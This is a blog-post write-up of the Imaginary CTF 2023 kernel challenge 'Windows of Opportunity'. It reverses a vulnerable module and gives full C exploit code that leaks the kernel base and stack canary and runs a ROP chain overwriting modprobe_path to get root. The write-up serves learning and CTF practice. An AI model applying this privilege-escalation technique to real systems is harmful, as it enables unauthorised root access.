---
layout: post
title: "Windows of Opportunity: Imaginary CTF 2023"
categories: Pwn Kernel
tags: Hacking Pwn
---

##IMAGINARY CTF 2023: Windows of Opportunity

Continuing this series of linux kernel exploitation, today we will explore , as title suggests, Windows of opportunity from Imaginary CTF 2023!
<!--excerpt-->

([Download here](https://cdn.discordapp.com/attachments/732682111462539276/1131972029415948368/opportunity_dist.zip#opportunity_dist.zip)), is very similar to Kernel ROP, but this time we have ioctls. The structure of post is similar to the previous one, first we analyze what we are given, reverse the vulnerable module, then we leak some addresses and finally we are root by exploiting some vuln.

# Reconnaissance
The most important files are as always:

run.sh, boot the kernel and the vulnerable module with qemu, also we can see the mitigation enabled from it:

>     gcc -static $2.c -o $2 -lpthread
>     qemu-system-x86_64 -no-reboot \
>         -m 256M\
>         -kernel $KERNEL_PATH \
>         -initrd $1  \
>         -cpu kvm64,+smep,+smap \
>         -append "console=ttyS0 oops=panic panic=1 kpti=1 kaslr quiet" \
>         -drive file=$2,format=raw \
>         -monitor /dev/null \
>         -serial mon:stdio \
>         -virtfs local,path=/tmp,mount_tag=host0,security_model=passthrough,id=foobar \
>         -nographic -s

We know that there are smep, smap, kpti and kaslr => we need to leak stuff and do some kernel rop fu.
This time there are 2 script that helps us debugging and running the exploit, decompress.sh that unpacks initramfs.cpio, so we can change some stuff at the boot time, and a Makefile that compile our exploits  and execute run.sh.
Decompressing initramfs.cpio we can Reverse Engineering chall.ko, the vulnerable module. The first vulnerable function is device_ioctl():

    000000a0  int64_t device_ioctl()
    
    000000a0      int64_t rdx_3
    000000a0      int32_t rsi_3
    000000a0      rdx_3, rsi_3 = __fentry__()
    000000b1      void* gsbase
    000000b1      int64_t rax = *(gsbase + 0x28)
    000000c6      if (rsi_3 == 0x1337)
    000000da          int64_t var_120
    000000da          _copy_from_user(&var_120, rdx_3, 0x108)
    000000ef          _copy_to_user(rdx_3 + 8, var_120, 0x100)
    000000fa      *(gsbase + 0x28)
    00000103      if (rax != *(gsbase + 0x28))
    0000011e          __stack_chk_fail()
    0000011e          noreturn
    00000110      return __x86_return_thunk(0, 0, 0) __tailcall

We see that there is a trivial arbitrary read vuln, we will use this to leak stuff. Analyzing it better `rsi_3` is ioctl number in this case is 0x1337, `rdx_3` is like an array we pass an array of max 0x108/8 elements, read the first element (array[0]) and write the result in array[1].
There is also device_write():

    00000130  int64_t device_write()
    
    00000130      __fentry__()
    0000013d      void* gsbase
    0000013d      int64_t rax = *(gsbase + 0x28)
    00000150      void var_50
    00000150      _copy_from_user(&var_50)
    00000159      *(gsbase + 0x28)
    00000162      if (rax != *(gsbase + 0x28))
    00000172          __stack_chk_fail()
    00000172          noreturn
    0000016d      return __x86_return_thunk(0, 0, 0) __tailcall

Here `_copy_from_user` is a vulnerable function where we will exploit a buffer overflow. There is also the Kernel stack cookie and in the pseudo c code is `int64_t rax = *(gsbase + 0x28)`.
It is also nice to see what kernel does when booted, we need to check `initramfs/etc/init.d/rcS` it contains:

    #!/bin/sh
    
    export PATH=/usr/sbin:/usr/bin:/sbin:/bin
    
    [ -d /dev ] || mkdir -m 0755 /dev
    # ln -sf /dev/null /dev/tty2
    # ln -sf /dev/null /dev/tty3
    # ln -sf /dev/null /dev/tty4
    
    [ -d /sys ] || mkdir /sys
    [ -d /proc ] || mkdir /proc
    [ -d /tmp ] || mkdir /tmp
    [ -d /run ] || mkdir /run
    [ -d /root ] || mkdir /root
    [ -d /etc ] || mkdir /etc
    [ -d /home ] || mkdir /home
    
    echo 'root:x:0:0:root:/root:/bin/sh' > /etc/passwd
    echo 'root:x:0:' > /etc/group
    chmod 644 /etc/passwd
    chmod 644 /etc/group
    
    adduser user --disabled-password
    
    chown -R root:root /
    chmod 700 -R /root
    chown user:user /home/user
    chmod 777 /home/user
    chmod 777 /tmp
    chmod 755 /dev
    chmod 0 /flag.txt
    
    mkdir -p /var/lock
    mount -t sysfs -o nodev,noexec,nosuid sysfs /sys
    mount -t proc -o nodev,noexec,nosuid proc /proc
    ln -sf /proc/mounts /etc/mtab
    mount -t devtmpfs -o nosuid,mode=0755 udev /dev
    mkdir -p /dev/pts
    mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || true
    mount -t tmpfs -o "noexec,nosuid,size=10%,mode=0755" tmpfs /run
    
    echo 2 > /proc/sys/kernel/kptr_restrict
    echo 2 > /proc/sys/kernel/perf_event_paranoid
    echo 1 > /proc/sys/kernel/dmesg_restrict
    
    # Mount Stuff
    mkdir /tmp/mount
    mount -t 9p -o trans=virtio,version=9p2000.L host0 /tmp/mount
    
    cp /dev/sda /exploit
    chmod +x /exploit
    insmod chall.ko
    
    # Register chardev, figure out run_cmd
    dmesg | grep mknod | awk -F "'" '{print $2}' | sh
    chmod 777 /dev/window
    
    echo -e "\nBoot time: $(cut -d' ' -f1 /proc/uptime)\n"
    
    setsid cttyhack setuidgid 1000 sh --login
    
    umount /proc
    umount /sys
    poweroff -d 0 -f

Here are some other security features enabled:

>     echo 2 > /proc/sys/kernel/kptr_restrict
>     echo 2 > /proc/sys/kernel/perf_event_paranoid
>     echo 1 > /proc/sys/kernel/dmesg_restrict

    When kptr_restrict is set to (2), kernel pointers printed using %pK will be replaced with 0’s regardless of privileges.
    When perf_event_paranoid is set to (2) controls use of the performance events system by unprivileged users (without CAP_SYS_ADMIN).
    When dmesg_restrict is set set to (1), users must have CAP_SYSLOG to use dmesg(8).

When we will use /proc/kallsyms we will see all zeroes despite being root!

# LEAKING
Following the last post, and what we have just seen we can write this simple script to leak kernel base address:
```c
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdbool.h>

#define device_ioctl 0x1337
int fd;

int main(){
	fd = open("/dev/window", O_RDWR);
	if (fd < 0){
		printf("Cannot open device\n");
		return -1;
	}
	printf("[+] Device Opened\n");

	unsigned long kbase = 0xffffffff80000000; // kernel base smallest address
	bool go = true;
	while(go){
		unsigned long response;
		unsigned long leak[32] = {0};
		leak[0] = kbase;
		ioctl(fd,device_ioctl, leak);
		printf("Possible Kernel Base Address: %lx ==> Leak: %lx\n",kbase, leak[1]);
		if (leak[1] != 0){break;}
		kbase += 0x100000;
	}
	printf("Kernel Base: %lx\n",kbase);
	return 0;
}
```

Here we open the device called `/dev/window`, then from the smallest kernel base address `0xffffffff80000000`, we try to leak it by seeing if is not null. Running it we get:

    / $ ./exploit 
    [+] Device Opened
    Possible Kernel Base Address: ffffffff80000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80200000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80300000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80400000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80500000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80600000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80700000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80800000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80900000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80a00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80b00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80c00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80d00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80e00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff80f00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81200000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81300000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81400000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81500000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81600000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81700000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81800000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81900000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81a00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81b00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81c00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81d00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81e00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff81f00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82200000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82300000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82400000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82500000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82600000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82700000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82800000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82900000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82a00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82b00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82c00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82d00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82e00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff82f00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83200000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83300000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83400000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83500000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83600000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83700000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83800000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83900000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83a00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83b00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83c00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83d00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83e00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff83f00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84200000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84300000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84400000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84500000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84600000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84700000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84800000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84900000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84a00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84b00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84c00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84d00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84e00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff84f00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85200000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85300000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85400000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85500000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85600000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85700000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85800000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85900000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85a00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85b00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85c00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85d00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85e00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff85f00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86200000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86300000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86400000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86500000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86600000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86700000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86800000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86900000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86a00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86b00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86c00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86d00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86e00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff86f00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87200000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87300000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87400000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87500000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87600000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87700000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87800000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87900000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87a00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87b00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87c00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87d00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87e00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff87f00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff88000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff88100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff88200000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff88300000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff88400000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff88500000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff88600000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff88700000 ==> Leak: 0
    Possible Kernel Base Address: ffffffff88800000 ==> Leak: 4802003f51258d48
    Kernel Base: ffffffff88800000

Now we need to leak the stack cookie, doing this is quite tricky, but when done the exploit is like 50% done!
Let's look at the kernel with some more privilege, let's modify `etc/init.d/rcS` in this way

    setsid cttyhack setuidgid 0 sh --login
    echo 0 > /proc/sys/kernel/kptr_restrict
    echo 0 > /proc/sys/kernel/perf_event_paranoid
    echo 0 > /proc/sys/kernel/dmesg_restrict

To compress the initramfs I wrote this bash script

    cd initramfs
    find . -print0 \
    | cpio --null -ov --format=newc > initramfs.cpio
    mv ./initramfs.cpio ../.

If all went good you should see something like this:

    / # cat /proc/kallsyms |head
    0000000000000000 A fixed_percpu_data
    0000000000000000 A __per_cpu_start
    0000000000001000 A cpu_debug_store
    0000000000002000 A irq_stack_backing_store
    0000000000006000 A cpu_tss_rw
    000000000000b000 A gdt_page
    000000000000c000 A exception_stacks
    0000000000018000 A entry_stack_storage
    0000000000019000 A espfix_waddr
    0000000000019008 A espfix_stack

I also attached gdb to vmlinux, I found vmlinux thanks to this [amazing tool](https://github.com/marin-m/vmlinux-to-elf), just follow installation instruction and then do this:

    $ vmlinux-to-elf bzImage vmlinux
    [+] Kernel successfully decompressed in-memory (the offsets that follow will be given relative to the decompressed binary)
    [+] Version string: Linux version 5.19.0-43-generic (buildd@lcy02-amd64-028) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #44~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon May 22 13:39:36 UTC 2 (Ubuntu 5.19.0-43.44~22.04.1-generic 5.19.17)
    [+] Guessed architecture: x86_64 successfully in 5.60 seconds
    [+] Found kallsyms_token_table at file offset 0x019d65d0
    [+] Found kallsyms_token_index at file offset 0x019d6980
    [+] Found kallsyms_markers at file offset 0x019d5ca8
    [+] Found kallsyms_names at file offset 0x017f9730
    [+] Found kallsyms_num_syms at file offset 0x017f9728
    [i] Negative offsets overall: 99.7368 %
    [i] Null addresses overall: 0.00133629 %
    [+] Found kallsyms_offsets at file offset 0x01767490
    [+] Successfully wrote the new ELF kernel to vmlinux

But why all these for just leaking the stack canary?
Our canary is located at $gs+0x28, easy to verify

    pwndbg> x/gx $gs_base+0x28
    0xffff8f3c4f600028:	0x19c51c1d2a206800

We need a way to leak gs_base+0x28 address or something near, but how we can do kernel is huge!
gs_base is determined at runtime, we want to look for places that store data and is also writeable/modifiable at runtime => .BSS
We can do it by grepping all kernel symbols from /proc/kallsyms with

    cat /proc/kallsyms | grep " b "|less

This is the first page:

    ffffffffad53e000 b dummy_mapping
    ffffffffad53f000 b level3_user_vsyscall
    ffffffffad540000 b idt_table
    ffffffffad541000 b espfix_pud_page
    ffffffffad542000 b bm_pte
    ffffffffad543000 b scratch.0
    ffffffffad544010 b initcall_calltime
    ffffffffad544018 b panic_param
    ffffffffad544020 b panic_later
    ffffffffad544028 b execute_command
    ffffffffad544030 b initargs_offs
    ffffffffad544038 b bootconfig_found
    ffffffffad544040 b extra_init_args
    ffffffffad544048 b extra_command_line
    ffffffffad544050 b static_command_line
    ffffffffad54405c b is_tmpfs
    ffffffffad544060 b root_wait
    ffffffffad544080 b real_root_dev
    ffffffffad544088 b initramfs_cookie
    ffffffffad544090 b my_inptr
    ffffffffad5440a8 b printed.0
    ffffffffad544160 b empty_attrs
    ffffffffad544168 b pmc_refcount
    ffffffffad54416c b active_events
    ffffffffad544180 b pair_constraint
    ffffffffad5441a8 b perf_nmi_window
    ffffffffad5441b0 b attrs_empty
    ffffffffad5441b8 b ibs_caps
    ffffffffad5441c0 b iommu_cpumask
    ffffffffad5445c0 b msr_mask

From this address `0xffffffffad544010` the various address stabilizes so we can check on gdb if from this address there is some pointer to gs_base.

    pwndbg> x/100gx 0xffffffffad544010
    0xffffffffad544010:	0x0000000000000000	0x0000000000000000
    0xffffffffad544020:	0x0000000000000000	0x0000000000000000
    0xffffffffad544030:	0x0000000000000000	0x0000000000000000
    0xffffffffad544040:	0x0000000000000000	0x0000000000000000
    0xffffffffad544050:	0xffff8f3c4fcdb8c0	0x0000000100000000
    0xffffffffad544060:	0x0000000000000000	0x0000000000000000
    0xffffffffad544070:	0x0000000000000000	0x0000000000000000
    0xffffffffad544080:	0x0000000000000000	0x0000000000000001
    0xffffffffad544090:	0x0000000000000000	0x0000000000000000
    0xffffffffad5440a0:	0x00000000009e3448	0x0000000000000001
    0xffffffffad5440b0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5440c0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5440d0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5440e0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5440f0:	0x0000000000000000	0x0000000000000000
    0xffffffffad544100:	0x0000000000000000	0x0000000000000000
    0xffffffffad544110:	0x0000000000000000	0x0000000000000000
    0xffffffffad544120:	0x0000000000000000	0x0000000000000000
    0xffffffffad544130:	0x0000000000000000	0xffffffffac75a1a0
    0xffffffffad544140:	0x0000000000000000	0xffffffffac75a510
    0xffffffffad544150:	0x0000000000000000	0xffffffffac75a530
    0xffffffffad544160:	0x0000000000000000	0x0000000000000000
    0xffffffffad544170:	0x0000000000000000	0x0000000000000000
    0xffffffffad544180:	0x0000000000000000	0x0000000000000000
    0xffffffffad544190:	0x0000000000000000	0x0000000000000000
    0xffffffffad5441a0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5441b0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5441c0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5441d0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5441e0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5441f0:	0x0000000000000000	0x0000000000000000
    0xffffffffad544200:	0x0000000000000000	0x0000000000000000
    0xffffffffad544210:	0x0000000000000000	0x0000000000000000
    0xffffffffad544220:	0x0000000000000000	0x0000000000000000
    0xffffffffad544230:	0x0000000000000000	0x0000000000000000
    0xffffffffad544240:	0x0000000000000000	0x0000000000000000
    0xffffffffad544250:	0x0000000000000000	0x0000000000000000
    0xffffffffad544260:	0x0000000000000000	0x0000000000000000
    0xffffffffad544270:	0x0000000000000000	0x0000000000000000
    0xffffffffad544280:	0x0000000000000000	0x0000000000000000
    0xffffffffad544290:	0x0000000000000000	0x0000000000000000
    0xffffffffad5442a0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5442b0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5442c0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5442d0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5442e0:	0x0000000000000000	0x0000000000000000
    0xffffffffad5442f0:	0x0000000000000000	0x0000000000000000
    0xffffffffad544300:	0x0000000000000000	0x0000000000000000
    0xffffffffad544310:	0x0000000000000000	0x0000000000000000
    0xffffffffad544320:	0x0000000000000000	0x0000000000000000

GS_BASE is at 0xffff8f3c4f600000, so the address that point to something near it is `0xffffffffad544050`:

    pwndbg> x/gx $gs_base
    0xffff8f3c4f600000:	0x0000000000000000
    pwndbg> x/gx 0xffffffffad544050
    0xffffffffad544050:	0xffff8f3c4fcdb8c0
    pwndbg> p/x 0xffff8f3c4fcdb8c0-$gs_base+0x28
    $2 = 0x6db8e8

But gdb is bad at calculating this stuff:
0xffff8f3c4fcdb8c0 − 0x6db8e8 = 0xFFFF8F3C4F5FFFD8
0xffff8f3c4f600028 (cookie) −0xFFFF8F3C4F5FFFD8 = 0x50
So 0x6db8e8 + 0x50 = 0x6DB938
Now we need to identify that address we are lucky to have an exploit that leaks the kernel base! (Running it we get `Kernel Base: ffffffffaae00000`), so 

    pwndbg> p/x 0xffffffffad544050: 0xffffffffaae00000
    $3 = 0x2744050

So translating all in c code it will be:

```c
unsigned long cookie;
unsigned long leak[32] = {0};
unsigned long leak2[32] = {0};
leak[0] = kbase + 0x2744050;
ioctl(fd, device_ioctl, leak);
leak2[0] = leak[1] - 0x6db898;
ioctl(fd, device_ioctl, leak2);
cookie = leak2[1];
printf("Kernel Cookie: %lx\n", cookie);
```
We can make our code looks better creating a function that does this:

    unsigned long arb_read(unsigned long ptr) {
            unsigned long leak[0x108/8] = {0};
            leak[0] = ptr;
            ioctl(fd, device_ioctl, leak);
            return leak[1];
    }
    unsigned long cookie = arb_read(arb_read(kbase + 0x2744050): 0x6db898);

Running it we get:

    Kernel Base: ffffffff8b200000
    Kernel Cookie: d54ce87f65d7bf00

Seems pretty good to me!

# EXPLOIT
As we saw from mitigation we have to rop also this time!
Running ROPgadget on our vmlinux file we got:

    Unique gadgets found: 1113512

We also need to redo the state saving as we do in KernelROP... and at the end of our payload we need to restore it.
I will use again modprobe_path overwrite because is my favorite technique. I will use the same shitty c code I used with last post.

    for (int i=1; i<=100;i++){
    	unsigned long payload[i];
    	ssize_t w = write(fd, payload, sizeof(payload));
    	printf("Cycle: %d\n",i);
    }

And we got:

    Cycle: 1
    Cycle: 2
    Cycle: 3
    Cycle: 4
    Cycle: 5
    Cycle: 6
    Cycle: 7
    Cycle: 8
    [    2.906202] Knock, and the door will be opened unto you.
    [    5.890603] Kernel panic: not syncing: stack-protector: Kernel stack is corrupted in: device_write+0x47/0x50 [chall]
    [    5.891607] CPU: 0 PID: 158 Comm: exploit Tainted: G           OE     5.19.0-43-generic #44~22.04.1-Ubuntu

If we inspect gadgets we are not that lucky as we were on Kernel Rop, where we have a ropchain like this

    -cookie
    -pop reg1
    -/tmp/m in hex
    -pop reg2
    -modprobe address
    -mov qword ptr [reg2], reg1 ; ret

This time we have to use `_copy_from_user`, this function has 3 parameters respectively: 

 1. RDI = modprobe_path address
 2. RSI = "/tmp/m" string
 3. RDX = length of string + 1

So now we need the offset of `_copy_from_user`, easy to get
 

    cat /proc/kallsyms |grep "T _copy_from_user"

And three gadget : pop rdi, pop rsi and pop rdx. So we get something like this:

    unsigned long pop_rdi = kbase + 0x1d675;
    unsigned long pop_rsi = kbase + 0x6ff0c;
    unsigned long pop_rdx = kbase + 0x7baf4a;
    unsigned long copy_from = kbase + 0x6e5d00;
    unsigned long modprobe = kbase + 0x208C500;
    unsigned long kpti = kbase + 0x1001126;

So our finale exploit code is:

```c
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdbool.h>

#define device_ioctl 0x1337
int fd;

unsigned long arb_read(unsigned long ptr) {
        unsigned long leak[0x108/8] = {0};
        leak[0] = ptr;
        ioctl(fd, device_ioctl, leak);
        return leak[1];
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void get_root(void){
	system("echo -e '#!/bin/sh\nchmod 777 /flag.txt' > /tmp/m");
	system("chmod +x /tmp/m");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
	system("chmod +x /tmp/dummy");
	system("/tmp/dummy");
	system("cat /flag.txt");
	exit(0);
}

int main(){

	save_state();

	fd = open("/dev/window", O_RDWR);
	if (fd < 0){
		printf("Cannot open device\n");
		return -1;
	}
	printf("[+] Device Opened\n");

	unsigned long kbase = 0xffffffff80000000; // kernel base smallest address
	bool go = true;
	while(go){
		unsigned long response;
		unsigned long leak[32] = {0};
		leak[0] = kbase;
		ioctl(fd,device_ioctl, leak);
		printf("Possible Kernel Base Address: %lx ==> Leak: %lx\n",kbase, leak[1]);
		if (leak[1] != 0){break;}
		kbase += 0x100000;
	}
	printf("Kernel Base: %lx\n",kbase);

	unsigned long cookie = arb_read(arb_read(kbase + 0x2744050) - 0x6db898);
	printf("Kernel Cookie: %lx\n", cookie);

	/*
	for (int i=1; i<=100;i++){
		unsigned long payload[i];
		ssize_t w = write(fd, payload, sizeof(payload));
		printf("Cycle: %d\n",i);
	}
	*/

	unsigned long pop_rdi = kbase + 0x1d675;
	unsigned long pop_rsi = kbase + 0x6ff0c;
	unsigned long pop_rdx = kbase + 0x7baf4a;
	unsigned long copy_from_user = kbase + 0x6e5d00;
	unsigned long modprobe = kbase + 0x208C500;
	unsigned long kpti = kbase + 0x1001126;

	char overwrite[] = "/tmp/m\x00";

	int off = 8;
	unsigned long payload[64];
	payload[off++] = cookie;
	payload[off++] = 0x0;
	payload[off++] = pop_rdi;
	payload[off++] = modprobe;
	payload[off++] = pop_rsi;
	payload[off++] = (unsigned long) overwrite;
	payload[off++] = pop_rdx;
	payload[off++] = strlen(overwrite) + 1;
	payload[off++] = copy_from_user;
	payload[off++] = kpti;
	payload[off++] = 0x0; // pop rax
	payload[off++] = 0x0; // pop rdi
	payload[off++] = (unsigned long)get_root;
	payload[off++] = user_cs;  //        WE RESTORE
	payload[off++] = user_rflags; //     HERE THE
	payload[off++] = user_sp; //         USERLAND
	payload[off++] = user_ss; //         STATE

	write(fd, payload, sizeof(payload));
	return 0;
}
```

Before testing remember to restore `initramfs/etc/init.d/rcS` to its initial state. Running our exploit we get:

    / $ ./exploit 
    [+] Device Opened
    [...]
    Possible Kernel Base Address: ffffffffb5e00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffffb5f00000 ==> Leak: 0
    Possible Kernel Base Address: ffffffffb6000000 ==> Leak: 0
    Possible Kernel Base Address: ffffffffb6100000 ==> Leak: 0
    Possible Kernel Base Address: ffffffffb6200000 ==> Leak: 4802003f51258d48
    Kernel Base: ffffffffb6200000
    Kernel Cookie: b6aab8137ad64200
    /tmp/dummy: line 1: ����: not found
    ictf{fake_flag_for_testing}

And also for today is all! Thanks for reading !!!
